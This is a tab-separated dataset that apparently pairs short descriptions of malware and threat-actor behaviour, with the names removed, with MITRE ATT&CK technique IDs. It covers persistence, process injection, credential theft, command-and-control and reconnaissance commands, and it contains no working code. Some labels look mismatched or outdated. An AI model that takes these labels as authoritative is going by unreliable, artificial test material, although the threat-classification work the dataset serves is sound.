identifies the victim username.	['T1033']
If an initial connectivity check fails,  attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.	['T1552.001']
If  cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.	['T1078']
If  does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number,  will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.	['T1095']
If installing itself as a service fails,  instead writes itself as a file named svchost.exe saved in %APPDATA%\Microsoft\Network.	['T1036']
If running as administrator,  installs itself as a new service named bmwappushservice to establish persistence.	['T1543.003']
implements a command and control protocol over HTTP.	['T1071']
"includes a capability to modify the ""beacon"" payload to eliminate known signatures or unpacking methods."	['T1027.005']
includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.	['T1113']
includes garbage code to mislead anti-malware software and researchers.	['T1027.001']
infected victims using JavaScript code.	['T1064']
injects a DLL for  into the explorer.exe process.	['T1055']
injects DLL files into iexplore.exe.	['T1055']
injects into other processes to load modules.	['T1055']
injects into the Internet Explorer process.	['T1055']
injects into the svchost.exe process.	['T1055']
injects its DLL component into svchost.exe.	['T1055']
injects its DLL file into a newly spawned Internet Explorer process.	['T1055']
injects itself into various processes depending on whether it is low integrity or high integrity.	['T1055']
injects its malware variant, , into the cmd.exe process.	['T1055']
inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.	['T1001']
installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.	['T1036']
"installed its payload in the startup programs folder as ""Baidu Software Update."" The group also adds its second stage payload to the startup programs as “Net Monitor."""	['T1036']
installer searches the Registry and system to see if specific antivirus tools are installed on the system.	['T1518.001']
installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry.	['T1543.003']
installs a registry Run key to establish persistence.	['T1547.001']
installs a root certificate to aid in man-in-the-middle actions.	['T1553.004']
installs a service pointing to a malicious DLL dropped to disk.	['T1543.003']
installs itself as a new service.	['T1543.003']
installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.	['T1543.003']
installs itself under Registry Run key to establish persistence.	['T1547.001']
Invoke-Kerberoast module can request service tickets and return crackable ticket hashes.	['T1558.003']
Invoke-TokenManipulation Exfiltration module can be used to locate and impersonate user logon tokens.	['T1134']
Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a  payload.	['T1047']
is a kernel-mode rootkit.	['T1014']
is a PowerShell backdoor.	['T1059.001']
is a RAT that communicates with HTTP.	['T1043']
is a rootkit that hides certain operating system artifacts.	['T1014']
is a rootkit used by .	['T1014']
is a simple proxy that creates an outbound RDP connection.	['T1090']
is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.	['T1014', 'T1542.001']
is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.	['T1542.003']
is a Web shell. The ASPXTool version used by  has been deployed to accessible servers running Internet Information Services (IIS).	['T1505.003']
is capable of accessing locally stored passwords on victims.	['T1552.001']
is capable of configuring itself as a service.	['T1543.003']
is capable of creating a remote Bash shell and executing commands.	['T1059']
is capable of creating a reverse shell.	['T1059']
is capable of creating reverse shell.	['T1059']
is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.	['T1070.004']
is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.	['T1070.004']
is capable of deleting Registry keys, sub-keys, and values on a victim system.	['T1112']
is capable of deleting Registry keys used for persistence.	['T1070']
is capable of downloading additional files.	['T1105']
is capable of downloading additional files through C2 channels, including a new version of itself.	['T1105']
is capable of downloading files, including additional modules.	['T1105']
is capable of downloading files from the C2.	['T1105']
is capable of downloading remote files.	['T1105']
is capable of enumerating and making modifications to an infected system's Registry.	['T1012']
is capable of enumerating and manipulating files and directories.	['T1083']
is capable of enumerating application windows.	['T1010']
is capable of executing commands.	['T1059']
is capable of executing commands and spawning a reverse shell.	['T1059']
is capable of executing commands via cmd.exe.	['T1059']
is capable of file deletion along with other file system interaction.	['T1070.004']
"is capable of injecting code into the APC queue of a created  process as part of an ""Early Bird injection."""	['T1055']
is capable of keylogging.	['T1056']
is capable of listing contents of folders on the victim.  also searches for custom network encryption software on victims.	['T1083']
is capable of listing files, folders, and drives on a victim.	['T1083']
is capable of loading executable code via process hollowing.	['T1055.012']
is capable of logging keystrokes.	['T1056']
is capable of obtaining directory, file, and drive listings.	['T1083']
is capable of opening a command terminal.	['T1059']
is capable of performing directory listings.	['T1083']
is capable of performing keylogging.	['T1056']
is capable of performing process listings.	['T1057']
is capable of performing remote command execution.	['T1059']
is capable of performing remote file transmission.	['T1105']
is capable of performing screen captures.	['T1113']
is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.	['T1547.001']
is capable of probing the network for open ports.	['T1046']
is capable of providing shell functionality to the attacker to execute commands.	['T1059']
is capable of reading files over the C2 channel.	['T1041']
is capable of recording keystrokes.	['T1056']
is capable of retrieving information about the infected system.	['T1082']
is capable of spawning a Windows command shell.	['T1059']
is capable of spreading to USB devices.	['T1091']
is capable of starting a process using CreateProcess.	['T1106']
is capable of stealing Outlook passwords.	['T1003']
is capable of taking an image of and uploading the current desktop.	['T1113']
is capable of taking screenshots.	['T1113']
is capable of uploading and downloading files.	['T1105']
is capable of using HTTP, HTTPS, SMTP, and DNS for C2.	['T1071']
is capable of using ICMP, TCP, and UDP for C2.	['T1095']
is capable of using its command and control protocol over port 443. However, Duqu is also capable of encapsulating its command protocol over standard application layer protocols. The Duqu command and control protocol implements many of the same features as TCP and is a reliable transport protocol.	['T1095']
is capable of using Windows hook interfaces for information gathering such as credential access.	['T1056.004']
is capable of writing a file to the compromised system from the C2 server.	['T1105']
is capable of writing to a Registry Run key to establish.	['T1547.001']
is controlled via commands that are appended to image files.	['T1001']
is digitally signed by Microsoft.	['T1553.002']
is executed using rundll32.exe.	['T1218.011']
is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.	['T1027']
is initially packed.	['T1027.002']
"is installed via execution of rundll32 with an export named ""init"" or ""InitW."""	['T1218.011']
is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.	['T1111']
is known to have the capability to overwrite the firmware on hard drives from some manufacturers.	['T1542.002']
is known to use RAR with passwords to encrypt data prior to exfiltration.	['T1486']
is known to use software packing in its tools.	['T1027.002']
is known to utilize encryption within network protocols.	['T1573']
is launched through use of DLL search order hijacking to load a malicious dll.	['T1574.001']
is obfuscated using the obfuscation tool called ConfuserEx.	['T1027']
is obfuscated using the open source ConfuserEx protector.  also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.	['T1027']
is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.	['T1027']
is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.	['T1553.002']
is used to automate SQL injection.	['T1190']
is used to enumerate and dump information from Microsoft SharePoint.	['T1213']
is used to execute programs and other actions at the command-line interface.	['T1059']
is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.	['T1098']
is used to poison name services to gather hashes and credentials from systems within a local network.	['T1557.001']
is used to schedule tasks on a Windows system to run at a specific date and time.	['T1053.005']
is usually configured with primary and backup domains for C2 communications.	['T1008']
is written in PowerShell.	['T1059.001']
keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.	['T1134']
kills and disables services by using cmd.exe.	['T1059']
kills and disables services for Windows Firewall, Windows Security Center, and Windows Defender.	['T1562.001']
kills anti-virus found on the victim.	['T1562.001']
kills security tools like Wireshark that are running.	['T1562.001']
Lateral movement can be done with  through net use commands to connect to the on remote systems.	['T1021.002']
launched a scheduled task to gain persistence using the schtasks /create /sc command.	['T1053.005']
launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.	['T1218.011']
launches a scheduled task.	['T1053.005']
launches a script to delete their original decoy file to cover tracks.	['T1070.004']
launches a shell to execute commands on the victim’s machine.	['T1059']
leveraged a compiled HTML file that contained a command to download and run an executable.	['T1218.001']
leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.	['T1046']
leveraged a watering hole to serve up malicious code.	['T1189']
leveraged PowerShell to download and execute additional scripts for execution.	['T1059.001']
leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.	['T1059.001']
leveraged several compromised universities as proxies to obscure its origin.	['T1090']
leveraged the DDE protocol to deliver their malware.	['T1559.002']
leveraged the tool LaZagne for retrieving login and password information.	['T1003']
leverages a custom packer to obfuscate its functionality.	['T1027.002']
leverages cmd.exe to perform discovery techniques.	['T1059']
leverages legitimate social networking sites and cloud platforms (Twitter, Yandex, and Mediafire) for command and control communications.	['T1102']
leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.	['T1102']
leverages valid accounts after gaining credentials for use within the victim domain.	['T1078']
leverages vulnerable versions of Flash to perform execution.	['T1203']
likely obtained a list of hosts in the victim environment.	['T1018']
listed remote shared drives that were accessible from a victim.	['T1135']
lists files in directories.	['T1083']
lists processes running on the system.	['T1057']
lists running processes.	['T1057']
lists the directories for Desktop, program files, and the user’s recently accessed files.	['T1083']
lists the running processes.	['T1057']
loads malicious shellcode and executes it in memory.	['T1064']
logs key strokes for configured processes and sends them back to the C2 server.	['T1056']
logs the keystrokes on the targeted system.	['T1056']
looks for specific files and file types.	['T1083']
lower disable security settings by changing Registry keys.	['T1562.001']
lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.	['T1204']
maintains access to victim environments by using  to access  as well as establishing a backup RDP tunnel by using .	['T1108']
makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.	['T1064']
makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.	['T1204']
malicious spearphishing payloads are executed as .  has also used  during and.	['T1059.001']
malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  has also used WMIC during and post compromise cleanup activities.	['T1047']
malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.	['T1110']
malware attempts to determine the installed version of .NET by querying the Registry.	['T1012']
malware can create a .lnk file and add a Registry Run key to establish persistence.	['T1547.009', 'T1547.001']
malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\Software\Microsoft\Office\.	['T1112']
malware can decode contents from a payload that was Base64 encoded and write the contents to a file.	['T1140']
malware can download additional files from C2 servers.	['T1105']
malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.	['T1083']
malware can list running processes.	['T1057']
malware can use a SOAP Web service to communicate with its C2 server.	['T1102']
malware can use process hollowing to inject one of its trojans into another process.	['T1055.012']
malware communicates with its C2 server via HTTPS.	['T1071']
malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly.	['T1053.005']
"malware deletes files in various ways, including ""suicide scripts"" to delete malware binaries from the victim.  also uses secure file deletion to delete files from the victim. Additionally,  malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine."	['T1070.004']
malware encrypts C2 traffic using RC4 with a hard-coded key.	['T1573']
malware gathers data from the local victim system.	['T1005']
malware gathers passwords from multiple sources, including Windows Credential Vault, Internet Explorer, Firefox, Chrome, and Outlook.	['T1003']
malware gathers system information via Windows Management Instrumentation (WMI).	['T1047']
malware gathers the Address Resolution Protocol (ARP) table from the victim.	['T1016']
malware gathers the registered user and primary owner name via WMI.	['T1033']
malware gathers the victim's local IP address, MAC address, and external IP address.	['T1016']
malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.	['T1043']
malware has communicated with its C2 server over ports 4443 and 3543.	['T1571']
malware has created scheduled tasks to establish persistence.	['T1053.005']
malware has obtained the victim username and sent it to the C2 server.	['T1033']
malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.	['T1082']
malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.	['T1027']
malware has used HTTP and IRC for C2.	['T1071']
malware has used HTTP for C2.	['T1071']
malware has used Registry Run keys to establish persistence.	['T1547.001']
malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt.	['T1012']
malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.	['T1016']
malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.	['T1010']
malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.  malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server.	['T1560']
malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.  malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server. A  malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.	['T1486']
malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.	['T1074']
malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another  malware sample also performs exfiltration over the C2 channel.	['T1041']
malware installs itself as a service to provide persistence and SYSTEM privileges.	['T1543.003']
malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.	['T1008']
"malware names itself ""svchost.exe,"" which is the name of the Windows shared service host program."	['T1036']
malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2. Additionally,  malware RoyalDNS has used DNS for C2.	['T1071']
malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.	['T1021.002']
malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.	['T1048']
malware SierraCharlie uses RDP for propagation.	['T1021.001']
Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).	['T1562.001']
Malware used by  can run commands on the command-line interface.	['T1059']
Malware used by  is capable of capturing keystrokes.	['T1056']
Malware used by  is capable of remotely deleting files from victims.	['T1070.004']
malware uses Caracachs encryption to encrypt C2 payloads.	['T1573']
malware uses cmd.exe to execute commands on victims.	['T1059']
malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.	['T1027']
malware uses PowerShell and WMI to script data collection and command execution on the victim.	['T1064']
malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.	['T1059.001']
malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.	['T1098']
malware xxmm contains a UAC bypass tool for privilege escalation.	['T1548.002']
manipulated .lnk files to gather user credentials in conjunction with .	['T1547.009']
Many  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.	['T1548.002']
Many  samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.	['T1070.006']
Many strings in  are obfuscated with a XOR algorithm.	['T1027']
may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.	['T1110']
may be used to exfiltrate data separate from the main command and control protocol.	['T1048']
may be used to find credentials in the Windows Registry.	['T1552.002']
may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.	['T1012']
may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.	['T1112']
may collect active network connections by running netstat -an on a victim.	['T1049']
may collect information about running processes.	['T1057']
may collect information about the system by running hostname and systeminfo on a victim.	['T1082']
may collect information the victim's anti-virus software.	['T1518.001']
may collect network configuration data by running ipconfig /all on a victim.	['T1016']
may collect permission group information by running net group /domain or a series of other commands on a victim.	['T1069']
may create a file containing the results of the command cmd.exe /c ipconfig /all.	['T1016']
may create a file containing the results of the command cmd.exe /c net user {Username}.	['T1087']
may create a temporary user on the system named “Lost_{Unique Identifier}.”	['T1136']
may create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique Identifier}.”	['T1136']
may enumerate user directories on a victim.	['T1083']
may gather a list of running processes by running tasklist /v.	['T1057']
may have used the  malware to move onto air-gapped networks.  targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.	['T1091']
may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.	['T1036']
may store RC4 encrypted configuration information in the Windows Registry.	['T1112']
"may use net group ""domain admins"" /domain to display accounts in the ""domain admins"" permissions group and net localgroup ""administrators"" to list local system administrator group membership."	['T1087']
may use net view /domain to display hostnames of available systems on a network.	['T1018']
may use  to add local firewall rule exceptions.	['T1562.001']
may use WMI when collecting information about a victim.	['T1047']
Microsoft Sysinternals  is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.	['T1569.002']
mimics a legitimate Russian program called USB Disk Security.	['T1036']
mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.	['T1036']
modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.	['T1112']
modifies the %regrun% Registry to point itself to an autostart mechanism.	['T1547.001']
modifies the time of a file as specified by the control server.	['T1070.006']
modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.	['T1070.006']
modules are written in and executed via .	['T1059.001']
Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.	['T1560', 'T1486', 'T1074']
monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.	['T1119']
"monitors USB devices and copies files with certain extensions to
a predefined directory."	['T1119']
Most of the strings in  are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.	['T1027']
Most  samples maintain persistence by setting the Registry Run key SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.	['T1547.001']
Most strings in  are encrypted using 3DES and XOR and reversed.	['T1027']
moved laterally via RDP.	['T1021.001']
MSGET downloader uses a dead drop resolver to access malicious payloads.	['T1102']
named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\microsoft\security.	['T1036']
network loader encrypts C2 traffic with RSA and RC6.	['T1573']
network traffic can communicate over a raw socket.	['T1095']
network traffic communicates over common ports like 80, 443, or 1433.	['T1043']
Newer variants of  will encode C2 communications with a custom system.	['T1001']
"New services created by  are made to appear like legitimate Windows services, with names such as ""Windows Management Help Service"", ""Microsoft Support"", and ""Windows Advanced Task Manager""."	['T1036']
obfuscated scripts that were used on victim machines.	['T1027']
obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR.	['T1027']
obfuscates C2 communication using a 1-byte XOR with the key 0xBE.	['T1573']
obfuscates C2 traffic with variable 4-byte XOR keys.	['T1573']
"obfuscates files by splitting strings into smaller sub-strings and including ""garbage"" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data."	['T1027']
obfuscates files or information to help evade defensive measures.	['T1027']
obfuscates internal strings and unpacks them at startup.	['T1027']
obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.	['T1027']
obfuscates strings using a custom stream cipher.	['T1027']
obtained OS version and hardware configuration from a victim.	['T1082']
obtains additional code to execute on the victim's machine.	['T1105']
obtains a list of running processes.	['T1057']
obtains a list of running processes on the victim.	['T1057']
obtains a list of running processes through WMI querying and the ps command.	['T1057']
obtains and saves information about victim network interfaces and addresses.	['T1049']
obtains application windows titles and then determines which windows to perform  on.	['T1010']
obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.	['T1083']
obtains the current user's security identifier.	['T1033']
obtains the IP address from the victim’s machine.	['T1016']
obtains the number of removable drives from the victim.	['T1120']
obtains the system time and will only activate if it is greater than a preset date.	['T1124']
obtains the victim's current time.	['T1124']
obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.	['T1082']
obtains the victim computer name and encrypts the information to send over its C2 channel.	['T1082']
obtains the victim IP address.	['T1016']
obtains the victim username.	['T1033']
obtains the victim username and encrypts the information to send over its C2 channel.	['T1033']
obtains Windows logon password details.	['T1003']
Once a removable media device is inserted back into the first victim,  collects data from it that was exfiltrated from a second victim.	['T1025']
Once  has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1.	['T1112']
One persistence mechanism used by  is to register itself as a scheduled task.	['T1053.005']
One persistence mechanism used by  is to register itself as a Windows service.	['T1543.003']
One variant of  creates a new service using either a hard-coded or randomly generated name.	['T1543.003']
One variant of  uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.	['T1102']
One variant of  uses HTTP and HTTPS for C2.	['T1071']
One version of  consists of VBScript and PowerShell scripts. The malware also uses batch scripting.	['T1064']
One version of  uses a PowerShell script.	['T1059.001']
opens a backdoor on TCP ports 6868 and 7777.	['T1571']
opens a remote shell to execute commands on the infected system.	['T1059']
opens the Windows Firewall to modify incoming connections.	['T1562.001']
operates over ports 21 and 20.	['T1043']
packs a plugin with UPX.	['T1027.002']
parses the export tables of system DLLs to locate and call various Windows API functions.	['T1106']
Part of 's operation involved using  modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.	['T1091']
Password stealer and NTLM stealer modules in  harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.  has also executed  for further victim penetration.	['T1003']
payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.	['T1027']
payloads download additional files from the C2 server.	['T1105']
performed a watering hole attack on forbes.com in 2014 to compromise targets.	['T1189']
"performs account discovery using commands such as net localgroup administrators and net group ""REDACTED"" /domain on specific permissions groups."	['T1087']
performs a reflective DLL injection using a given pid.	['T1055']
performs BIOS modification and can download and execute a file as well as protect itself from removal.	['T1542.001']
performs data exfiltration is accomplished through the following command-line command: from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt.	['T1020']
performs data exfiltration over the control server channel using a custom protocol.	['T1041']
performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.	['T1113']
performs local network connection discovery using netstat.	['T1049']
performs most of its operations using Windows Script Host (Jscript and VBScript) and runs arbitrary shellcode .	['T1064']
performs multiple process injections to hijack system processes and execute malicious code.	['T1055']
performs operating system information discovery using systeminfo.	['T1082']
performs service discovery using net start commands.	['T1007']
performs several anti-VM and sandbox checks on the victim's machine.	['T1518.001']
performs the tasklist command to list running processes.	['T1057']
performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.  performs a separate injection of its communication module into an Internet accessible process through which it performs C2.	['T1055']
performs timestomping of a CAB file it creates.	['T1070.006']
performs UAC bypass.	['T1548.002']
persists via a Launch Agent.	['T1543.001']
persists via a login item.	['T1547.015']
probes the system to check for sandbox/virtualized environments and other antimalware processes.	['T1518.001']
prompts the user for their credentials.	['T1056']
prompts users for their credentials.	['T1056']
provides access to the system via SSH or any other protocol that uses PAM to authenticate.	['T1071']
provides access to the Windows Registry, which can be used to gather information.	['T1012']
provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet	['T1059']
provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet	['T1205.001']
provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.	['T1205.001']
provides a reverse shell on the victim.	['T1059']
puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.	['T1036.006']
queries Registry keys in preparation for setting Run keys to achieve persistence.	['T1012']
queries several Registry keys to identify hard disk partitions to overwrite.	['T1012']
queries the Registry for specific keys for potential privilege escalation and proxy information.	['T1012']
queries the Registry to determine the correct Startup path to use for persistence.	['T1012']
ran a command to compile an archive of file types of interest from the victim user's directories.	['T1005', 'T1119']
ran a reverse shell with Meterpreter.	['T1059']
ran genuinely-signed executables from Symantec and McAfee which loaded a malicious DLL called rastls.dll.	['T1574.002']
RAT is able to delete files.	['T1070.004']
RAT is able to list processes.	['T1057']
RAT is able to open a command shell.	['T1059']
RAT is able to wipe event logs.	['T1070']
recursively generates a list of files within a directory and sends them back to the control server.	['T1119']
registers itself as a service by adding several Registry keys.	['T1543.003']
registers itself as a service on the victim’s machine to run as a standalone process.	['T1569.002']
"registers itself under a Registry Run key with the name ""USB Disk Security."""	['T1547.001']
relays traffic between a C2 server and a victim.	['T1090']
removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.	['T1070.004']
removes logs from /var/logs and /Library/logs.	['T1070']
renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.	['T1036']
replaces the Sticky Keys binary C:\Windows\System32\sethc.exe for persistence.	['T1546.008']
reports window names along with keylogger information to provide application context.	['T1010']
Rundll32.exe is used as a way of executing  at the command-line.	['T1218.011']
runs cmd.exe /c and sends the output to its C2.	['T1059']
runs ipconfig /all and collects the domain name.	['T1016']
runs its core DLL file using rundll32.exe.	['T1218.011']
runs tasklist to obtain running processes.	['T1057']
runs tests to determine the privilege level of the compromised user.	['T1033']
runs the command: net start >> %TEMP%\info.dat on a victim.	['T1007']
runs the command net user on a victim.  also runs tests to determine the privilege level of the compromised user.	['T1087']
runs the ifconfig command to obtain the IP address from the victim’s machine.	['T1016']
runs the net view /domain and net view commands.	['T1018']
runs the net view command	['T1018']
runs the whoami and query user commands.	['T1033']
runs whoami on the victim’s machine.	['T1033']
samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32.	['T1546.015']
samples have been signed with a code-signing certificates.	['T1553.002']
samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.	['T1553.002']
samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.	['T1027.002']
samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.	['T1553.002']
samples were timestomped by the authors by setting the PE timestamps to all zero values.  also has a built-in command to modify file times.	['T1070.006']
saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .	['T1119']
saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.	['T1036']
"saves itself with a leading ""."" so that it's hidden from users by default."	['T1564.001']
scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).	['T1518.001']
scans processes on all victim systems in the environment and uses automated scripts to pull back the results.	['T1064', 'T1119']
scans the C-class subnet of the IPs on the victim's interfaces.	['T1018']
schedules the execution one of its modules by creating a new scheduler task.	['T1053.005']
scripts save memory dump data into a specific directory on hosts in the victim environment.	['T1074']
searches attached and mounted drives for file extensions and keywords that match a predefined list.	['T1083']
searches for certain Registry keys to be configured before executing the payload.	['T1012']
searches for files created within a certain timeframe and whose file extension matches a predefined list.	['T1083']
searches for files named logins.json to parse for credentials and also looks for credentials stored from browsers.	['T1552.001']
searches for files on attached removable drives based on a predefined list of file extensions every five seconds.	['T1025']
searches for files on local drives based on a predefined list of file extensions.	['T1005']
searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by .	['T1025']
searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.	['T1083']
searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.	['T1114']
searches for network drives and removable media and duplicates itself onto them.	['T1105']
searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.	['T1114']
searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.	['T1119']
searches the local system and gathers data.	['T1005']
searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip	['T1083']
searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).	['T1114']
searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.	['T1083']
SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.	['T1550.002']
sends an OS version identifier in its beacons.	['T1082']
sends emails to victims with a malicious executable disguised as a document or spreadsheet displaying a fake icon.	['T1598.002']
sends images to users that are embedded with shellcode and obfuscates strings and payloads.	['T1027']
sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.	['T1082']
sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.	['T1598.002']
sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.	['T1598.003']
sent spear phishing emails containing links to .hta files.	['T1598.003']
sent spearphishing emails containing malicious Microsoft Office attachments.	['T1598.002']
sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.	['T1598.003']
service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.	['T1546.009']
service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.	['T1083']
